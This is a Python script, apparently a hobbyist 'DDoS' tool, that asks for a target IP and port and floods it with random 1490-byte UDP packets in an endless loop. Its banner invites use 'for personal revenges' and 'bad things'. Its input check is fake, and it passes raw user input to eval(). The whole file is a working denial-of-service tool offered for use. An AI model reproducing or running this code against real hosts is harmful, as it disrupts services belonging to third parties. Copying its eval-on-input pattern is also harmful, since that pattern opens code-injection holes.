#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ******************************************************
    *  &     &   $ $ $ $   X    x  $ $ $ $   5 5 5 5 5   *
    *  &     &   $          x  x   $         5           *
    *  &     &   $ $ $ $           $ $ $ $   5 5 5 5     *
    *  &     &   $          x  x   $                 5   *
    *   & & &    $ $ $ $   x    x  $ $ $ $   5 5 5 5     *    
    *                                                    *
    *             DO IT AND F EVERYONE !!!               *
    *              CREATOR: ALM3ROF UEXE5                *       
    ******************************************************
    ******************************************************
    *                                  FUCK SOCIETY  :)  *    
    *  [!] READ IT KID :)                                *
    *  1. Use it For Personal Revenges                   *
    *  2. UEXE5 Is Not Responsible For Your Jobs         *
    *  3. UEXE5 made it for bad things enjoy             * 
    *  4. UEXE5 EVERY WHERE !!!!                         *
    ******************************************************
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give UEXE5 A Target IP : ")
port = eval(input(" [+] Starting Port NO : "))
os.system("clear")
print('''
    ******************************************************
    *  &     &   $ $ $ $   X    x  $ $ $ $   5 5 5 5 5   *
    *  &     &   $          x  x   $         5           *
    *  &     &   $ $ $ $           $ $ $ $   5 5 5 5     *
    *  &     &   $          x  x   $                 5   *
    *   & & &    $ $ $ $   x    x  $ $ $ $   5 5 5 5     *    
    *                                                    *
    *                                                    *
    *             DO IT AND F EVERYONE !!!               *
    *              CREATOR: ALM3ROF UEXE5                *
    ******************************************************

	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    UEXE5 IS HERE TO DDOS THIS MF ")
print(" " )
print(" [+] UEXE5 started attack this mf " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] UEXE5 sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] UEXE5 FINISH IT...")
